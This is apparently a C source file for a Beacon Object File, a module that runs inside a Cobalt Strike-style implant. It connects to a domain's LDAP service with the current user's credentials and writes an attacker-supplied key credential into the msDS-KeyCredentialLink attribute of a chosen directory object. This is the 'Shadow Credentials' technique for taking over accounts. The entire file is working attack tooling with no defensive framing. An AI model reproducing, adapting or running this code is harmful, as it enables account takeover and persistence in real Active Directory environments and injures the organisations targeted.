#include <windows.h>
#include <winldap.h>
#include "bofdefs.h"
#include "beacon.h"

WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_option(LDAP *ld, int option, void *invalue);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_s(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    char *domain = BeaconDataExtract(&parser, NULL);
    char *target_dn = BeaconDataExtract(&parser, NULL);
    char *credential_string = BeaconDataExtract(&parser, NULL);
    
    LDAP *ld = NULL;
    int result;
    int version = LDAP_VERSION3;
    
    BeaconPrintf(CALLBACK_OUTPUT, "Adding KeyCredentialLink to: %s\n", target_dn);
    
    ld = WLDAP32$ldap_init(domain, LDAP_PORT);
    if (ld == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP init failed\n");
        return;
    }
    
    result = WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Set version failed: %s\n", WLDAP32$ldap_err2string(result));
        goto cleanup;
    }
    
    result = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Bind failed: %s\n", WLDAP32$ldap_err2string(result));
        goto cleanup;
    }
    
    char *vals[2] = { credential_string, NULL };
    
    LDAPMod mod;
    mod.mod_op = LDAP_MOD_ADD;
    mod.mod_type = "msDS-KeyCredentialLink";
    mod.mod_vals.modv_strvals = vals;
    
    LDAPMod *mods[2] = { &mod, NULL };
    
    result = WLDAP32$ldap_modify_s(ld, target_dn, mods);
    if (result == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "KeyCredentialLink added successfully\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Modify failed: %s\n", WLDAP32$ldap_err2string(result));
    }
    
cleanup:
    WLDAP32$ldap_unbind(ld);
}